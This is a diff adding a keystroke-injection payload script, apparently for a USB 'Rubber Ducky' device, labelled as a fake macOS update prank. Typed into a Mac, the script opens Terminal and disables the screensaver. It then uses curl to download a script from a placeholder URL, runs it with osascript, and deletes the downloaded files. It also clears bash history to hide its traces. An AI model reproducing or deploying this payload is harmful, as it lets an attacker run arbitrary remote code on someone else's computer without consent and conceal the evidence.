@@ -1,0 +1,39 @@
+REM FakeUpdate Mac Version 1.0.2
+REM Opens fakeupdate.net/apple in fullscreen
+REM Author: hack MadProps: fachsimpeln for the idea
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 250
+ENTER
+DELAY 250
+STRING defaults -currentHost write com.apple.screensaver idleTime 0
+DELAY 250
+ENTER
+DELAY
+STRING mkdir /Users/$USER/.cya
+DELAY 250
+ENTER
+DELAY 250
+STRING curl http://www.yoururlgoeshere > /Users/$USER/.cya/open.scpt
+DELAY 250
+ENTER
+DELAY 250
+STRING osascript /Users/$USER/.cya/open.scpt
+ENTER
+DELAY 250
+STRING rm -rf /Users/$USER/.cya
+ENTER
+DELAY 250
+STRING rm -rf /Users/$USER/.Trash/.cya*
+DELAY 250
+ENTER
+DELAY 250
+STRING cat /dev/null > ~/.bash_history && history -cw
+DELAY 250
+ENTER
+DELAY 250
+STRING osascript -e 'tell application "Terminal" to close first window' & exit
+DELAY 250
+ENTER
